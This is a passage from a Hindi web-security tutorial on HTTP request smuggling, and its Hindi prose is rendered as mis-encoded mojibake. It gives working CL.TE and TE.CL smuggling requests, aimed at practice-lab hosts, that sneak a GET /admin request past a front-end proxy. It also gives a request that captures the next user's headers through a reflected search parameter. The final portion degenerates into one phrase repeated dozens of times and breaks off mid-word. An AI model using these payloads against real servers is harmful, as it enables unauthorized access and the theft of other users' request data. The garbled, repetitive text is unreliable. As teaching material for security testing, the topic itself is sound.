- рдмрд░реНрдк рд╕реНрдпреВрдЯ рдХреА 'HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд░' рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╡рд┐рднрд┐рдиреНрди рд░реВрдкреЛрдВ рдХреЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдХрд░ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ рдЗрди рдЬреЛрдЦрд┐рдореЛрдВ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

- **рдХрдВрдЯреЗрдВрдЯ-рд▓реЗрдВрде рд╡реЗрд░рд┐рдПрдВрд╕ рдкрд░реАрдХреНрд╖рдг:**
- рд╡рд┐рднрд┐рдиреНрди `Content-Length` рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдЬреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд╛рдордЧреНрд░реА рд▓рдВрдмрд╛рдИ рдХреЗ рд╕рд╛рде рд╕рдорд╛рди рдирд╣реАрдВ рд╣реИрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЕрд╕рдВрдЧрддрд┐рдпреЛрдВ рдХрд╛ рдХреИрд╕реЗ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИред

- **рдЯреНрд░рд╛рдВрд╕рдлрд░-рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рд╡реЗрд░рд┐рдПрдВрд╕ рдкрд░реАрдХреНрд╖рдг:**
- рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдпрд╛ рдЧрд▓рдд рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП `Transfer-Encoding` рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рд░реНрд╡рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдорд╛рдирд┐рдкреБрд▓реЗрд╢рди рдХрд╛ рдХреИрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддреЗ рд╣реИрдВред
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
**рдЯреА.рдИ.рдП рдЕрдЯреИрдХ** рдореЗрдВ, рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдЖрдЧрдВрддреБрдХ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз `Transfer-Encoding: chunked` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рд╛рд░рдВрднрд┐рдХ `POST` рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдПрдореНрдмреЗрдбреЗрдб `GET /admin` рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛, рдЬрд┐рд╕рд╕реЗ `/admin` рдкрде рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИред
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
рдЙрд▓реНрдЯреЗ, TE.CL рд╣рдорд▓реЗ рдореЗрдВ, рдкреНрд░рд╛рд░рдВрднрд┐рдХ `POST` рдЕрдиреБрд░реЛрдз `Transfer-Encoding: chunked` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЖрдЧрдВрддреБрдХ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз `Content-Length` рд╣реЗрдбрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рд╣реЛрддрд╛ рд╣реИред CL.TE рд╣рдорд▓реЗ рдХреА рддрд░рд╣, рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдЫрд▓рд╛ рдЧрдпрд╛ `GET /admin` рдЕрдиреБрд░реЛрдз рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд `/admin` рдорд╛рд░реНрдЧ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓рддрд╛ рд╣реИред

### рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдз рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд╛ рдкреНрд░рдХрдЯреАрдХрд░рдг <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЕрдХреНрд╕рд░ рдПрдХ **рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдЖрдЧрдВрддреБрдХ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░рддреЗ рд╣реИрдВ рдкрд╣рд▓реЗ рдЙрдиреНрд╣реЗрдВ рдкреАрдЫреЗ рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдкрд╛рд░рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗред рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╕рдВрд╢реЛрдзрди рдореЗрдВ рд╢реАрд░реНрд╖рдХ рдЬреЛрдбрд╝рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ, рдЬреИрд╕реЗ `X-Forwarded-For: <рдЧреНрд░рд╛рд╣рдХ рдХрд╛ рдЖрдИрдкреА>` рдХреЗ рд░реВрдк рдореЗрдВ, рдЧреНрд░рд╛рд╣рдХ рдХрд╛ рдЖрдИрдкреА рдкреАрдЫреЗ рдХреЛ рд░реАрд▓реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрди рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреЛ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрд░рдХреНрд╖рдг рдХреЛ **рдЫрд▓рдиреЗ** рдпрд╛ **рдЫрд┐рдкреЗ рд╣реБрдП рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рдЕрдВрддрдмрд┐рдВрджреБ** рдХреЛ **рдЦреЛрд▓рдиреЗ** рдХреЗ рддрд░реАрдХреЗ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдХреИрд╕реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдмрджрд▓рддрд╛ рд╣реИ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреЛрд╕реНрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдЬрд┐рд╕реЗ рдкреАрдЫреЗ рдХрд╛ рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдзреНрд╡рдирд┐ рдореЗрдВ рджреЛрд╣рд░рд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдЕрдиреБрд░реЛрдз рддреИрдпрд╛рд░ рдХрд░реЗрдВ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
рдЗрд╕ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ, рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдШрдЯрдХ `search=` рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рд╕реЗ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣реЗрдбрд░реНрд╕ рдЙрдЬрд╛рдЧрд░ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗред

рдиреЗрд╕реНрдЯреЗрдб рдЕрдиреБрд░реЛрдз рдХреА `Content-Length` рд╣реЗрдбрд░ рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд╛рдордЧреНрд░реА рд▓рдВрдмрд╛рдИ рдХреЗ рд╕рд╛рде рд╕рдВрд░реЗрдЦрд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдПрдХ рдЫреЛрдЯреЗ рдореВрд▓реНрдп рд╕реЗ рд╢реБрд░реВ рдХрд░рдХреЗ рд╕реАрдзреЗ рдмрдврд╝рд╛рддреЗ рдЬрд╛рдирд╛ рдЙрдкрдпреБрдХреНрдд рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдмрд╣реБрдд рдХрдо рдореВрд▓реНрдп рд╕реЗ рд░рд┐рдлреНрд▓реЗрдХреНрдЯ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдХрд╛рдЯ рджреЗрдЧрд╛, рдЬрдмрдХрд┐ рдмрд╣реБрдд рдЙрдЪреНрдЪ рдореВрд▓реНрдп рдЕрдиреБрд░реЛрдз рдХреЛ рддреНрд░реБрдЯрд┐ рджреЗрдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ TE.CL рдЬреЛрдЦрд┐рдо рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рднреА рд▓рд╛рдЧреВ рд╣реИ, рд▓реЗрдХрд┐рди рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдорд╛рди рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред

рдпрд╣ рд╡рд┐рдзрд┐ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ 